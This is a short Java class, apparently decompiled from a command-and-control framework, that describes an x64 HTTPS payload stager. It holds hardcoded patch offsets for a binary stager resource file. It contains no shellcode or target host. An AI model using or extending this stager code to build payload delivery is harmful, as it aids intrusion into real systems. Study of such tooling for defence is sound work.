package stagers;

import common.ScListener;

public abstract class GenericHTTPSStagerX64 extends GenericHTTPStager {
   public GenericHTTPSStagerX64(ScListener var1) {
      super(var1);
   }

   public int getExitOffset() {
      return 811;
   }

   public int getPortOffset() {
      return 274;
   }

   public int getSkipOffset() {
      return 898;
   }

   public int getFlagsOffset() {
      return 314;
   }

   public String arch() {
      return "x64";
   }

   public String getStagerFile() {
      return "resources/httpsstager64.bin";
   }
}
